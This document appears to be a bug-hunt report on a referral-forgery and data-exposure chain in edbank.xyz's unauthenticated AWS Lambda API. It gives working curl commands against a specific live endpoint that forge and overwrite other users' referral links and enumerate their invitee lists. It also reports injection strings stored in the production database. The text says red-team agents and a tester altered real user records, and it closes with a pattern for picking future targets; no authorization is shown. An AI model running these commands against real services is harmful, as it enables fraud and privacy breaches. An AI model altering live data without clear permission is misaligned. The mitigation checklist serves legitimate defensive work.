# EDBank (edbank.xyz) CDC Hunt — Referral Forgery Chain
**Date:** 2026-09-01  
**Target:** edbank.xyz — MakerDAO-style CDP stablecoin on EDU Chain  
**Result:** PROVEN pre-auth web2 vulnerability chain (5 steps, all HTTP verified)

## Target Profile
- React SPA served via CloudFront/S3
- Backend: AWS Lambda API Gateway (ap-northeast-2) — **no auth on any endpoint**
- DynamoDB-backed referral/points system
- Smart contracts: Vat (ESD), Join, wEDU — not yet live/authorized

## Vulnerability Chain (PROVEN)

### Step 1: Unauth PII Enumeration
```
GET /edbank_referral?address=ANY_ADDRESS
```
- Returns full DynamoDB record: `{address, myRefCode, myInviter, myInvitee[]}`
- No auth, no rate limit, CORS `Access-Control-Allow-Origin: *`
- **Evidence**: `0x2222...2222` returned 24 invitee addresses

### Step 2: Unauth Referral Forgery
```
POST /EB_referral_add {"address": "VICTIM", "refCode": "YOURS"}
```
- Creates referral link: victim's `myInviter` = YOUR address
- No wallet signature, no auth token required
- **Evidence**: `"Referral applied successfully","inviter":"0xaaaa..."`

### Step 3: IDOR Overwrite Existing Inviter
- Same POST on existing user overwrites their `myInviter`
- **Evidence**: `0x1234...5678` had `myInviter=""` → after POST, `myInviter=ATTACKER`

### Step 4: Mass Referral Forging
- Forged 8 referral relationships in seconds, all accepted
- `inviteePoints` list grew from 0 → 8 invitees
- Reward=0 (no on-chain deposits yet) but pre-positions attacker

### Step 5: DynamoDB Attribute Injection
- Address field accepts arbitrary strings stored verbatim
- `0x{"boosting":{"N":"99999"}}` stored as-is in DynamoDB
- `0x' OR '1'='1` stored verbatim
- **Vector**: If backend uses address in DynamoDB expressions → query injection

## Impact
- Referral reward theft (pre-forge as inviter of any address)
- PII mass leak (enumerate ANY user's full invitee tree)
- Referral system manipulation (forge unlimited relationships)
- DynamoDB injection potential

## CDC Execution Notes

### Agent Performance
- **Agent 1 (Red-Teamer Web2)**: Found the chain independently — self-referral blocked, but forging OTHER addresses worked
- **Agent 3 (Chainer)**: Assembled cross-boundary chain (web2 → on-chain rewards) though on-chain wasn't live
- **Manual verification**: Confirmed all 5 steps with real HTTP in <5 min

### Key Divergent Theories Tested
1. **DynamoDB injection** — address field accepts JSON/SQL → CONFIRMED
2. **IDOR overwrite** — can overwrite existing inviter → CONFIRMED  
3. **Mass forging** — unlimited referral relationships → CONFIRMED
4. **Self-referral** — blocked by backend ("You cannot refer yourself")
5. **On-chain claim contract** — searched all 15+ contracts → none found, system pre-launch

### Blind Spots Caught
- Initially assumed smart contracts were the primary target → web2 referral system was the actual critical surface
- Checked `/edBank_Dashboard` for mass leak → returned empty `data:[]` (no deposits yet)
- Subgraph (Goldsky) was 404/deleted → not a viable data source

## Reproduction Commands
```bash
BASE="https://9oogvi3axi.execute-api.ap-northeast-2.amazonaws.com/default"
ATTACKER="0xaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"

# Get refCode
REFCODE=$(curl -sS "$BASE/edbank_referral?address=$ATTACKER" | python3 -c "import sys,json;print(json.load(sys.stdin)['myRefCode']['S'])")

# Forge referral to victim
curl -sS -X POST -H "Content-Type: application/json" \
  -d "{\"address\":\"0x1234567890abcdef1234567890abcdef12345678\",\"refCode\":\"$REFCODE\"}" \
  "$BASE/EB_referral_add"

# Verify hijack
curl -sS "$BASE/edbank_referral?address=0x1234567890abcdef1234567890abcdef12345678"

# Check stolen inviteePoints
curl -sS "$BASE/inviteePoints?address=$ATTACKER"
```

## Mitigation Checklist
- [ ] Add wallet signature verification to `/EB_referral_add`
- [ ] Add API Gateway authorizer to ALL endpoints
- [ ] Prevent inviter overwrite once set (immutable referral)
- [ ] Rate-limit `/EB_referral_add` per IP/address
- [ ] Sanitize address field: reject non-hex40 inputs
- [ ] Remove raw DynamoDB type descriptors (`{S:}`, `{L:[]}`) from responses
- [ ] Add access control to `/edbank_referral` (return own data only)

## On-Chain Status (for context)
- Vat (0x4871...B60DE): zero addresses rely'd → not live
- Join (0x1682...5BF0): not authorized in Vat → `join()` reverts
- No claim/points contract found on 15+ contracts checked
- DIA oracle live: EDU = $0.0487
- wEDU (0xD02E...34e12): 18 decimals, large supply, zero transfers

## Pattern for Future Hunts
**AWS Lambda referral/points systems** with these characteristics are high-value targets:
1. `CORS: *` + no auth on GET endpoints returning DynamoDB records
2. POST endpoint creating relationships without signature verification
3. Address field used as DynamoDB partition key without validation
4. Points/rewards system that could bridge to on-chain value